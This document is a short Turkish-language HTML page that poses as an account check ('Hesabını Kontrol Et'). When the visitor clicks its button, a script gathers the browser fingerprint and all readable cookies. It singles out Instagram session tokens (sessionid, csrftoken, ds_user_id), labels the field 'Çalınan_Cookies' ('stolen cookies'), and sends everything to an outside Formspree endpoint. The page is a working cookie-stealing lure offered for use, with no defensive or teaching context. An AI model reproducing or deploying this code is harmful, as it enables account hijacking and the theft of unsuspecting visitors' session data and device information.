<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Lütfen Erişin</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #222; color: #fff; }
        .container { text-align: center; }
        button { padding: 15px 30px; font-size: 18px; background: #008CBA; color: white; border: none; cursor: pointer; border-radius: 5px; }
        button:hover { background: #005f7f; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Hesabını Kontrol Et</h2>
        <p>Bilgilerini almak için butona tıkla.</p>
        <button onclick="verileriTopla()">Tıkla ve Devam Et</button>
    </div>

    <script>
        async function verileriTopla() {
            // Gizli verileri topla
            let data = new FormData();
            
            // Tarayıcı ve Cihaz Bilgileri
            data.append('Tarayıcı', navigator.userAgent);
            data.append('IP Adresi', 'IP adresi sunucu tarafından görülecek (Formspree header: X-Forwarded-For)');
            data.append('Ekran Çözünürlüğü', window.screen.width + 'x' + window.screen.height);
            data.append('Dil', navigator.language);
            data.append('İşlemci Sayısı', navigator.hardwareConcurrency);
            data.append('Bellek', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Bilinmiyor');
            
            // Instagram ve Diğer Cookie Bilgileri (Oturum bilgisini çalar)
            let cookies = document.cookie;
            if(cookies) {
                data.append('Çalınan_Cookies', cookies);
                // Instagram tokenlarını özellikle vurgula
                let instaCookies = cookies.split(';').filter(c => c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id'));
                if(instaCookies.length > 0) {
                    data.append('Instagram_Tokenları', instaCookies.join(', '));
                }
            }

            // Formspree'ye gönder
            try {
                await fetch('https://formspree.io/f/xrppvwel', {
                    method: 'POST',
                    body: data,
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                alert("Bilgilerin başarıyla alındı!");
            } catch (error) {
                console.error('Hata:', error);
            }
        }
    </script>
</body>
</html>
